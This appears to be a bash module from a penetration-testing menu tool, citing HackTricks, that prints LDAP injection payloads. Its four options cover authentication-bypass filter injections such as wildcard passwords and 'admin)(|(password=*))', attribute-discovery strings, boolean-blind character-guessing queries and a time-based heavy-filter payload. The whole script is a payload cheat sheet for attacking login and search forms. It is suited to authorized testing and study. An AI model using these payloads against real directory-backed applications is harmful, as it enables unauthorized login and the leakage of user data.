#!/bin/bash
# HackTricks Ref: lda-injection
# Module: LDAP Injection (Directory Services)

echo -e "${C6}[WEB ATTACK: LDAP_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/ldap-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select LDAP Injection Vector:${NC}"
echo "1) Authentication Bypass (The '*' trick)"
echo "2) Attribute Discovery (Information Leakage)"
echo "3) Blind LDAP Injection (Boolean-based)"
echo "4) Blind LDAP Injection (Time-based)"
echo "0) Exit"

read -p "Selection: " ldap_opt

case $ldap_opt in
    1)
        echo -e "\n${C2}[*] Authentication Bypass Payloads:${NC}"
        echo "Use the wildcard '*' to match any password or user:"
        echo " - Username: admin"
        echo " - Password: *"
        echo " - Filter Injection: admin)(&)"
        echo " - Filter Injection: admin)(|(password=*))"
        ;;
    2)
        echo -e "\n${C2}[*] Attribute Extraction:${NC}"
        echo "Goal: Find hidden fields like 'description', 'mail', or 'objectClass'."
        echo "Payload for search fields:"
        echo " - *)(objectClass=*))(&"
        echo " - *)(&(description=*))"
        ;;
    3)
        echo -e "\n${C2}[*] Boolean Blind LDAP:${NC}"
        echo "Check if a character is correct by observing the response:"
        echo " - admin)(description=a*)"
        echo " - admin)(description=b*)"
        echo "If the app says 'User Found' for 'a*' but not 'b*', the description starts with 'a'."
        ;;
    4)
        echo -e "\n${C2}[*] Time-Based Blind LDAP (LDAP Oracle):${NC}"
        echo "Used when there's no visual difference in the response."
        echo "Note: Requires a server that supports heavy computations or specific extensions."
        echo " - Payload: admin)(|(X=1)(X=2)...[repeat thousands of times])"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
